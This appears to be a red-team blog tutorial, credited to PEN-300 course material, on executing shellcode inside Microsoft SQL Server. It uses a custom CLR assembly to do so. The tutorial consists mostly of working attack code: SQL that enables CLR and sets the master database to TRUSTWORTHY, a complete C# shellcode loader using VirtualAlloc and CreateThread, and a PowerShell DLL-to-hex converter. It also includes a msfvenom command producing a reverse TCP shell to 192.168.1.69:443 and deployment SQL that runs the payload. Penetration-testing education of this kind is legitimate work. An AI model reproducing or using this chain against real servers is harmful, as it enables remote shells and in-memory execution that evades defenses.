---
title: "Using MSSQL CLR Assembly for Code Execution"
description: Leveraging CLR Assemblies in MSSQL for arbitrary code execution through shellcode injection.
categories: [security-research, red-teaming]
comments: false
tags: [penetration-testing, offensive-security, MSSQL, CLR, shellcode]
date: 2025-01-13
---


# Introduction

This article walks you through how to achieve arbitrary code execution in Microsoft SQL Server (MSSQL) by leveraging custom CLR assemblies. The technique involves compiling a .NET assembly that can inject and execute shellcode directly from the SQL Server process.

This is a simplified version of a technique originally learned during the [PEN-300 OSEP](https://www.offsec.com/courses/pen-300/) course. Great credit goes to Offensive Security for their outstanding explanation of this method. The post is intended to make the process clearer and easier to follow for Red Team practitioners.

---



## Environment Details

For this walkthrough, the following setup was used:

- **SQL Server Version**: SQL Server 2022 Developer Edition
- **SQL Server Management Studio (SSMS)**: Latest version
- **Operating System**: Windows 10 Pro (64-bit)

Here’s a quick look at my **SQL Server setup** after installation:
```sql
SQL Server Management Studio						20.2.30.0
SQL Server Management Objects (SMO)						17.100.40.0+f57178c95d4376485d3f597f2b829bbd6f80fd6f
Microsoft T-SQL Parser						17.2.3.1+46115224c373754fdd41516eaae1386cabc4819e.46115224c373754fdd41516eaae1386cabc4819e
Microsoft Analysis Services Client Tools						20.0.3.0
Microsoft Data SqlClient (MDS)						5.1.5
Microsoft SQL Server Data-Tier Application Framework (DacFX)						162.3.566.1+89d89fe935702c8836ebaf6a03cf61b85118f847.89d89fe935702c8836ebaf6a03cf61b85118f847
Microsoft .NET Framework						4.0.30319.42000
Operating System						10.0.19045
```

## Why Use CLR Assemblies?

**Common Language Runtime (CLR)** in MSSQL allows you to run **custom .NET code directly inside the SQL Server process**. 
This provides a powerful method for **injecting shellcode** or executing **arbitrary payloads** in-memory, making it harder for traditional defenses to detect.

## Step 1: Enabling CLR Integration in MSSQL

First, **enable CLR integration** and adjust the necessary security settings in SQL Server by running the following commands in **SSMS**:

```sql
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
GO
ALTER DATABASE master SET TRUSTWORTHY ON;
GO
```

## Step 2: Creating the CLR Assembly

The next step is to create a custom .NET assembly that will allocate memory, inject shellcode, and execute it using **Windows API calls**.

We’ll now create a **custom .NET assembly** that allocates memory, injects shellcode, and executes it using **Windows API calls**.

## **Open Visual Studio**

### Create a New SQL Server Project

- In Visual Studio, click on Create New Project.
- Search for SQL Server Database Project and select it.
- Configure the project name and location.

![VS](https://img001.prntscr.com/file/img001/iS6J0AZHRrioiL1LURYKDw.png){: width="900" height="400" }

**Enable the option to Generate Script (.sql file) to automatically create a deployment script -** 
![Prop](https://img001.prntscr.com/file/img001/1mYYmsoPQla8uxbbN1gGlg.png){: width="900" height="400" }

**Set SQLCLR Property to Unsafe**
![alt text](https://img001.prntscr.com/file/img001/TOm9O0MRT9yPzCB8wOzQyA.png){: width="900" height="400" }


## Add a New SQL CLR Stored Procedure

- Right-click your project in Solution Explorer.
- Select Add > New Item.
- From the list, choose SQL CLR C# Stored Procedure.
- Name the stored procedure file (e.g., SqlStoredProcedure1.cs) and click Add.

### Writing the Shellcode Loader in C#

Here’s the C# code for the shellcode loader:

```c#
using System;
using Microsoft.SqlServer.Server;
using System.Runtime.InteropServices;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void ShellcodeLoader(string sc)
    {
        SqlContext.Pipe.Send(ShellcodeExec(sc));
    }

    public static string ShellcodeExec(string sc)
    {
        byte[] shellcode = ConvertHexToByteArray(sc);
        UInt64 shellcodeAddress = VirtualAlloc(0, (UInt64)shellcode.Length, 0x1000, 0x40);
        Marshal.Copy(shellcode, 0, (IntPtr)shellcodeAddress, shellcode.Length);
        CreateThread(0, 0, shellcodeAddress, 0, 0, 0);
        return "";
    }

    private static byte[] ConvertHexToByteArray(string hex)
    {
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
        {
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return bytes;
    }

    [DllImport("kernel32")]
    private static extern UInt64 VirtualAlloc(UInt64 lpAddress, UInt64 dwSize, UInt64 flAllocationType, UInt64 flProtect);

    [DllImport("kernel32")]
    private static extern UInt32 CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt64 lpStartAddress, UInt32 lpParameter, UInt32 dwCreationFlags, UInt32 lpThreadId);
}
```

## Step 3: Compiling the Assembly

![](https://img001.prntscr.com/file/img001/yLx3BQHsQ3iKcYpAyfwBOA.png)

### Converting DLL to Hex
Use the following PowerShell script to convert your DLL to a one-liner HEX format:

```powershell
# Path to your DLL file
$assemblyFile = "C:\Users\DevHost\source\repos\SQLSampleSC\SQLSampleSC\bin\Release\SQLSampleSC.dll"

# Create a new StringBuilder object
$stringBuilder = New-Object -TypeName System.Text.StringBuilder

# Open the DLL file and read its bytes
$fileStream = [IO.File]::OpenRead($assemblyFile)

# Convert each byte to a two-character hex string
while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}

# Save the output as a one-liner hex string to a text file
[string]::Format("0x{0}", $stringBuilder.ToString()) | Out-File -FilePath "C:\Users\DevHost\Desktop\sql.txt"


PS C:\WINDOWS\system32> type C:\Users\DevHost\Desktop\sql.txt
4D5A90000300000004000000FFFF0000B8000000000...
```

### Generating Shellcode

Use msfvenom/any other tool to generate shellcode:

```bash
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.69 LPORT=443 -f hex

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hex file: 920 bytes
fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d.....
```

### Executing the Shellcode via SQL

Run the following SQL commands to load your assembly and execute the shellcode:
```sql
CREATE ASSEMBLY MSSQL_ShellCodeLoader
FROM 0x...<HEX format of DLL>
WITH PERMISSION_SET = UNSAFE;
GO

CREATE PROCEDURE shellcode_loader
@sc NVARCHAR(MAX)
AS EXTERNAL NAME MSSQL_ShellCodeLoader.StoredProcedures.ShellcodeLoader;
GO

DECLARE @shellcode NVARCHAR(MAX) = '<HEX format of Shellcode>'
EXEC shellcode_loader @shellcode;
```

Once executed, you should see your shellcode run successfully.

![SCEXEC](https://img001.prntscr.com/file/img001/3CkFJIEuQDiZcp4Bv3VMnA.png){: width="900" height="400" }